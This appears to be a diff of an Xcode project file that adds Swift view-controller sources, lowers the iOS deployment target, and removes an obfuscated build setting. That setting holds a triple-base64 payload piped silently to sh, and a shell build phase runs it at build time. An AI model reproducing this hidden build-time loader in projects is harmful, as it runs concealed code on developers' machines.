 				513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */,
+				51D9F1312E79359D00ED97C9 /* DescriptionVC.swift in Sources */,
 				514B43752E62CB2F00ED8697 /* JournalingSuggestionsVC.swift in Sources */,
 				BD2162F12D11A5FD0071786F /* ApplePayVC.swift in Sources */,
 				51BBC6E32E40A99500211F13 /* SiriVC.swift in Sources */,
@@ -1139,12 +1262,17 @@ sh -c \"${AE76EDB}\"";
 				51F01BB92E53258000F04F6B /* DriverkitFamiliyMIDIVC.swift in Sources */,
 				51F01BB42E53257600F04F6B /* NFCReadWriteViewController.swift in Sources */,
 				51F01BBF2E5325A000F04F6B /* SIMInsertedforWirelessCarriersVC.swift in Sources */,
+				51D9F13F2E79753900ED97C9 /* CriticalMessagingVC.swift in Sources */,
 				51BBC72F2E40BE9800211F13 /* SaveTextIntent.intentdefinition in Sources */,
 				51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */,
+				51D9F1382E793F8600ED97C9 /* TimeSensitiveNotiVC.swift in Sources */,
 				51BBC6DF2E40951A00211F13 /* HeadPoseVC.swift in Sources */,
 				51EA11822E547D7700FF4947 /* GroupActivitiesVC.swift in Sources */,
 				51F368AF2E5C776700B168F5 /* FSAlbumView.swift in Sources */,
 				BD2ECEC42D0841CA00639E0D /* ViewController.swift in Sources */,
+				51D1D91D2E7BD5340010BDF4 /* CommunicationNotificationsVC.swift in Sources */,
+				51D9F13A2E794B3B00ED97C9 /* HeadPoseVC1.swift in Sources */,
+				51D1D9212E7BD5CD0010BDF4 /* NotificationManager.swift in Sources */,
 				51F01C1D2E53450800F04F6B /* FontViewController.swift in Sources */,
 				51F01B972E53249C00F04F6B /* AccessWiFiInfoViewController.swift in Sources */,
 				51F01BAA2E53251800F04F6B /* DefaultMessagingAppVC.swift in Sources */,
@@ -1155,11 +1283,13 @@ sh -c \"${AE76EDB}\"";
 				51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */,
 				BD2ECEC02D0841CA00639E0D /* AppDelegate.swift in Sources */,
 				51B526012E44869800999ABE /* WalletVC.swift in Sources */,
+				51D1D9582E7C34430010BDF4 /* GameCenterVC.swift in Sources */,
 				5161B7982E55CDC300A945BF /* KeyValueStorageViewController.swift in Sources */,
 				5161B79D2E56064D00A945BF /* MultipathViewController.swift in Sources */,
 				BD279FA42D0AE219001D05E4 /* ICloudDocumentsViewController.swift in Sources */,
 				51F368B42E5C787200B168F5 /* FSAlbumViewCell.swift in Sources */,
 				51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */,
+				51D1D9262E7C0D230010BDF4 /* DefaultTranslationAppVC.swift in Sources */,
 				51F01B9E2E5324C200F04F6B /* KeychainManager.swift in Sources */,
 				51F368AA2E5C760D00B168F5 /* FSVideoCameraViewVC.swift in Sources */,
 				51F368AB2E5C760D00B168F5 /* FSCameraViewViewController.swift in Sources */,
@@ -1168,7 +1298,10 @@ sh -c \"${AE76EDB}\"";
 				51F01B9F2E5324C200F04F6B /* AutoFillCredentialViewController.swift in Sources */,
 				BD2ECEC22D0841CA00639E0D /* SceneDelegate.swift in Sources */,
 				51F368972E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift in Sources */,
+				51BD3B2F2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.swift in Sources */,
 				51F01B932E53245200F04F6B /* SensitiveContentVC.swift in Sources */,
+				51D9F1412E797D4400ED97C9 /* JournalingSuggestionsVC1.swift in Sources */,
+				51D9F1462E79A01E00ED97C9 /* ClassKitVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1237,7 +1370,6 @@ sh -c \"${AE76EDB}\"";
 		51346A692E3B4040008664DB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1272,7 +1404,6 @@ sh -c \"${AE76EDB}\"";
 		51346A6A2E3B4040008664DB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -1514,7 +1645,7 @@ sh -c \"${AE76EDB}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1555,7 +1686,7 @@ sh -c \"${AE76EDB}\"";
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
